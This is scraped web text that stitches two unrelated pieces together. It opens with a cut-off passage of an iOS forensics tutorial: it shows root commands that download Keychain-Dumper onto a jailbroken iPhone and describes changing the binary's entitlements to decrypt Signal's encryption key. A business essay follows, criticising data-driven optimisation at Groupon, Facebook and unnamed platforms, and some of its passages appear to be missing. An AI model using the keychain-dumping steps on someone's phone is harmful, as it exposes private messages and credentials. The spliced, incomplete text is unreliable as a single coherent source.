entitlements</a>. Changes in 13.5 made it such that apps need specific entitlements. Thankfully, it's possible to update an executable's entitlements, even as a binary.</p><p>The <code>keychain_dumper</code> binary included in its <a href="https://github.com/ptoomey3/Keychain-Dumper">GitHub repo</a> has wildcard entitlements. We'll need to update them in order to give it permission to decrypt the Signal key.</p><p><strong>Install Keychain Dumper on the iPhone</strong></p><p>Back on the iPhone, download and extract the <a href="https://github.com/ptoomey3/Keychain-Dumper/releases/tag/1.0.0">keychain_dumper binary</a>, and move it to <code>/usr/bin</code>.</p><pre><code>root# wget https://github.com/ptoomey3/Keychain-Dumper/releases/download/1.0.0/keychain_dumper-1.0.0.zip
root# unzip keychain_dumper-1.0.0.zip
root# mv keychain_dumper /usr/bin</code></pre><p><strong>Update <em>keychain_dumper</em>'s …</strong></p></div></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-d54917c3f4c66758a8bd"><div><p>I really believe you have to be careful with data.</p><p>There’s this assumption that if you split test, the data tells you what’s better.</p><p>But that’s clearly not always the case.</p><p>Why?</p><p>This is actually a bigger idea than it seems.</p><p>Many companies that have a data-first approach don’t realize they’re reasoning off of an assumption and treat it like an axiom. [1]</p><p>But optimize long enough and everything becomes the equivalent of BuzzFeed or porn.</p><p>Clickbait, sex, drama, and superficialness. Being everything to everyone and nothing to no one.</p><p>Groupon’s quality went down the drain because Mason’s employees told him sending more emails per day increased revenue.</p><p>The deals became ever lower in quality and users got annoyed.</p><p>There was a time where people<strong> could not wait</strong> to get an email from Groupon. They had killer deals. They had hilarious copywriters. Even if you didn’t buy, getting an email was a treat. But now that it has been properly sterilized to please spineless, risk-averse shareholders, and optimized for maximum quarterly revenue, can you think of a single person that feels that way anymore? Not one person? Groupon clearly has lost its soul, its essence. Mason said in an interview (can’t recall the source) that he wondered if Groupon was meant to be an extraordinary company, just for a smaller market. It certainly would have made it easier to build the company according to his vision rather than something that needed to please the shareholders that needed an IPO to get a return.</p><p>In the early days you had the GOATS like Reid Hoffman (founder LinkedIn), Max Levchin (Paypal and Affirm), and the likes answering questions. Now it’s some 14yr old telling you about the opportunity of a lifetime: screencasting stories from Reddit, having the speech to text tool read them, turn it into a video and put it on YouTube. And then…? Millions I guess?</p><p>It went from THE place to get high-quality courses from knowledgeable instructors to the flea-market of cheap knock-offs and fake guru business opportunity courses. While you can find quality courses there, the overall quality has badly degraded. The best instructors aren’t incentivized to create a course because your $1000 course containing 3 decades of experience will sell for $9.99 of which you’ll get $2.50. So if you actually have something to offer, you’ll go somewhere else, leaving mainly the type of people that game the system in order to make a quick buck.</p><p>People used to LOVE Facebook with a vengeance. Now I have 80 notifications, 40 of which are new friend suggestions of people I’ve never met, 20 are strangers that sent out a blast to get likes for their new page, 17 are events, and 3 are birthdays. [2]</p><p>Oh yeah… and not 1 is actually relevant to me.&nbsp;You can fool a user only so many times before you’ve essentially trained them to ignore you.</p><p><em>They started implementing the same dark patterns with their DM. You get notifications for being friends for a certain time and when you accept a new friend.</em></p><p>In its search for endless optimization, the platform has become bloated and just plain annoying. I can’t think of a single person in my cohort (and younger cohorts) that use FB as much or more as 10 years ago.&nbsp;</p><p>The current demographic appears to be the same type of people that use Bing over Google, or Explorer over Chrome. Late adopters that are sticky to defaults.</p><p>So be careful when optimizing. Remember the quantification bias! </p><p><em>Discussed in </em><a href="https://www.younglingfeynman.com/essays/paradigm"><em>Paradigm Shift: Drastically Increase The Odds of Success</em></a></p><p>Just because something is easy to measure doesn’t mean it’s insightful. Just because something can’t be measured easily doesn’t mean it isn’t.</p><p>Remember that business is part art part science: <a href="https://www.younglingfeynman.com/essays/artofbusiness" target="_blank">The Art Of Business, Where Science And Business Depart</a>.</p><p>[1]  I <a href="https://www.younglingfeynman.com/essays/comedy">made the point before</a> when it comes to certain areas that are sufficiently complex (e.g. statistics, data science, economics), you either want no one or a person with extraordinarily deep expertise. </p><p>Interesting piece on the fraud that’s going on in Data Science: <a href="https://logicmag.io/intelligence/interview-with-an-anonymous-data-scientist/"><em>The Smart, the Stupid, and the Catastrophically Scary: An Interview with an Anonymous Data Scientist</em></a></p><p>What you don’t want is someone that knows enough to bullshit you but not enough to get it right. An indicator that you might have the right person is the phrase: ‘‘I’m not sure’’ or ‘‘ it depends on…’’. In these fields, the vast majority of so-called experts add no value at best or negative value at worst.</p><p>[2] This is what I admired so much about Systrom’s and Krieger’s Instagram. Their almost zen-like essentialism. No bloating, no fluff, trying very hard to take away things as they did about adding things. How many new features did they launch in a month before their Facebook acquisition? How many new features does IG launch now per month? </p><p>I’m not saying adding new features is bad. I’m also not saying that a company shouldn’t scale. The point I’m making is that entropy is real. It’s much easier for your product to become worse, than it is to become better. So if that’s not a core focus, it probably won’t happen by accident.</p><p>But scale and improvements in user love (which follow from a better service/product) are not mutually exclusive. Apple provides a data point. Especially during the Jobs reign. </p><p><em>More on this in the essay series: </em><a href="https://www.younglingfeynman.com/essays/deeplove"><em>Do You Have Customers Who Deeply Love You?</em></a><em> </em></p></div></div></div>]]>
